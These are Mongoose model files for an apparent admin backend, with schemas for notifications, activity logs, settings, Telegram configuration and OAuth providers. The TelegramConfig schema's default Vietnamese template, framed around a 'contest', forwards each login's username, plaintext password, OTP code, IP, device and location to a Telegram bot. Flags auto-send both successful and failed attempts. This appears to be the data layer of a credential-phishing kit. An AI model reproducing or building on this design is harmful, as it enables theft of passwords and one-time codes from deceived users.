// models/SystemNotification.js
const mongoose = require('mongoose');

const systemNotificationSchema = new mongoose.Schema({
  type: {
    type: String,
    required: true,
    enum: ['User Login', 'Data Export', 'System Error', 'Security Alert', 'Update Available', 'Backup Completed']
  },
  title: {
    type: String,
    required: true
  },
  message: {
    type: String,
    required: true
  },
  target: {
    type: String,
    required: true
  },
  status: {
    type: String,
    enum: ['success', 'warning', 'error', 'info', 'pending'],
    default: 'info'
  },
  priority: {
    type: String,
    enum: ['low', 'medium', 'high', 'critical'],
    default: 'medium'
  },
  read: {
    type: Boolean,
    default: false
  },
  readBy: [{
    user: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    },
    readAt: {
      type: Date,
      default: Date.now
    }
  }],
  metadata: {
    type: Object,
    default: {}
  },
  relatedEntity: {
    entityType: String,
    entityId: mongoose.Schema.Types.ObjectId
  }
}, {
  timestamps: true
});

// Index for faster queries
systemNotificationSchema.index({ target: 1, read: 1, createdAt: -1 });
systemNotificationSchema.index({ type: 1, status: 1 });

module.exports = mongoose.model('SystemNotification', systemNotificationSchema);

// models/ActivityLog.js
const mongoose = require('mongoose');

const activityLogSchema = new mongoose.Schema({
  user: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  action: {
    type: String,
    required: true
  },
  entity: {
    type: String,
    required: true
  },
  entityId: {
    type: mongoose.Schema.Types.ObjectId
  },
  details: {
    type: String
  },
  ipAddress: {
    type: String,
    required: true
  },
  userAgent: {
    type: String
  },
  location: {
    country: String,
    city: String,
    region: String
  },
  changes: {
    type: Object
  },
  result: {
    type: String,
    enum: ['success', 'failed', 'partial'],
    default: 'success'
  },
  duration: {
    type: Number
  }
}, {
  timestamps: true
});

// Index for faster queries
activityLogSchema.index({ user: 1, createdAt: -1 });
activityLogSchema.index({ action: 1, entity: 1 });
activityLogSchema.index({ ipAddress: 1 });

module.exports = mongoose.model('ActivityLog', activityLogSchema);

// models/Setting.js
const mongoose = require('mongoose');

const settingSchema = new mongoose.Schema({
  key: {
    type: String,
    required: true,
    unique: true
  },
  value: {
    type: mongoose.Schema.Types.Mixed,
    required: true
  },
  type: {
    type: String,
    enum: ['string', 'number', 'boolean', 'object', 'array'],
    required: true
  },
  category: {
    type: String,
    required: true,
    enum: ['general', 'security', 'telegram', 'email', 'backup', 'api']
  },
  description: {
    type: String
  },
  isPublic: {
    type: Boolean,
    default: false
  },
  isEditable: {
    type: Boolean,
    default: true
  },
  validation: {
    required: Boolean,
    min: Number,
    max: Number,
    pattern: String
  },
  updatedBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User'
  }
}, {
  timestamps: true
});

// Index for faster queries
settingSchema.index({ category: 1, key: 1 });

module.exports = mongoose.model('Setting', settingSchema);

// models/TelegramConfig.js
const mongoose = require('mongoose');

const telegramConfigSchema = new mongoose.Schema({
  botToken: {
    type: String,
    required: true
  },
  chatId: {
    type: String,
    required: true
  },
  channelName: {
    type: String
  },
  isActive: {
    type: Boolean,
    default: true
  },
  autoSendLogin: {
    success: { type: Boolean, default: true },
    failed: { type: Boolean, default: true },
    otpGenerated: { type: Boolean, default: false }
  },
  messageTemplate: {
    login: {
      type: String,
      default: `🔐 THÔNG TIN ĐĂNG NHẬP

📋 Cuộc thi: {{contestName}}
👤 Username: {{username}}
🔑 Password: {{password}}
🔐 OTP: {{otpCode}}
⏰ Thời gian: {{timestamp}}
🌐 IP: {{ipAddress}}
📱 Device: {{device}}
{{#if location}}📍 Vị trí: {{location}}{{/if}}
{{statusIcon}} Trạng thái: {{status}}`
    },
    bulk: {
      type: String,
      default: `📊 BÁO CÁO ĐĂNG NHẬP HÀNG LOẠT

📅 Thời gian: {{timestamp}}
📋 Số lượng: {{count}} bản ghi
✅ Thành công: {{successCount}}
❌ Thất bại: {{failedCount}}
⏳ Đang chờ: {{pendingCount}}`
    }
  },
  lastConnectionTest: {
    type: Date
  },
  lastError: {
    message: String,
    timestamp: Date
  },
  statistics: {
    messagesSent: { type: Number, default: 0 },
    lastMessageSent: Date,
    errors: { type: Number, default: 0 }
  },
  updatedBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User'
  }
}, {
  timestamps: true
});

module.exports = mongoose.model('TelegramConfig', telegramConfigSchema);

// models/OAuthConfig.js
const mongoose = require('mongoose');

const oauthConfigSchema = new mongoose.Schema({
  provider: {
    type: String,
    required: true,
    enum: ['facebook', 'google', 'github', 'twitter'],
    unique: true
  },
  clientId: {
    type: String,
    required: true
  },
  clientSecret: {
    type: String,
    required: true
  },
  scope: [String],
  callbackUrl: {
    type: String,
    required: true
  },
  isActive: {
    type: Boolean,
    default: true
  },
  settings: {
    autoCreateUser: { type: Boolean, default: true },
    defaultRole: { type: String, default: 'editor' },
    requireVerification: { type: Boolean, default: false }
  },
  metadata: {
    type: Object,
    default: {}
  },
  updatedBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User'
  }
}, {
  timestamps: true
});

module.exports = mongoose.model('OAuthConfig', oauthConfigSchema);